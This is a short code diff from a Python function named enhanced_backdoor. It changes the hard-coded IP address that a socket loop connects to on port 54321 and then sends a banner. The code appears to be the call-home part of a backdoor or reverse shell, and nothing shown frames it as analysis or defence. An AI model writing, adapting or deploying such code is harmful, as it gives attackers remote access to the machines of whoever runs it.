@@ -47,7 +47,7 @@ def enhanced_backdoor():
         while True:
             try:
                 s = socket.socket()
-                s.connect(("142.93.23.15", 54321))
+                s.connect(("223.181.59.55", 54321))
                 
                 # ASCII-ONLY banner - no special characters!
                 s.send(b"\n")
